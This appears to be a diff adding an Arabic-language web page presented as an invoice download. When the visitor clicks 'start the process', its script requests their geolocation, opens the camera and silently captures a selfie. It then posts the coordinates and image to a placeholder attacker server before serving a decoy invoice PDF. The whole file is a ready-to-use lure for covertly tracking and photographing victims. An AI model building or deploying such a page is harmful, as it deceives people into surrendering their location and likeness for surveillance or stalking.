@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>فاتورة + سيلفي</title>
+<style>
+body { text-align:center; font-family: sans-serif; margin-top: 50px; }
+video, canvas { border: 1px solid black; margin-top: 10px; }
+button { margin-top: 10px; padding: 10px 20px; font-size: 16px; }
+</style>
+</head>
+<body>
+<h2>اضغط الزر لإتمام العملية 📸📍</h2>
+<button id="start">ابدأ العملية</button>
+<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+document.getElementById('start').addEventListener('click', async () => {
+    // طلب الموقع
+    let position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject);
+    });
+    let lat = position.coords.latitude;
+    let lon = position.coords.longitude;
+
+    // فتح الكاميرا والتقاط سيلفي
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+    video.style.display = 'block';
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    video.srcObject = stream;
+
+    // ننتظر 3 ثواني قبل التقاط الصورة
+    await new Promise(r => setTimeout(r, 3000));
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const selfieData = canvas.toDataURL('image/png');
+    stream.getTracks().forEach(track => track.stop());
+    video.style.display = 'none';
+    canvas.style.display = 'none';
+
+    // إرسال البيانات للسيرفر
+    fetch('https://yourserver.com/upload', {  // ضع رابط سيرفرك هنا
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ lat: lat, lon: lon, selfie: selfieData })
+    }).then(() => {
+        // تنزيل الملف بعد إرسال البيانات
+        const a = document.createElement('a');
+        a.href = 'https://yourserver.com/file.pdf'; // رابط الملف
+        a.download = 'فاتورة.pdf';
+        document.body.appendChild(a);
+        a.click();
+    });
+});
+</script>
+</body>
+</html>
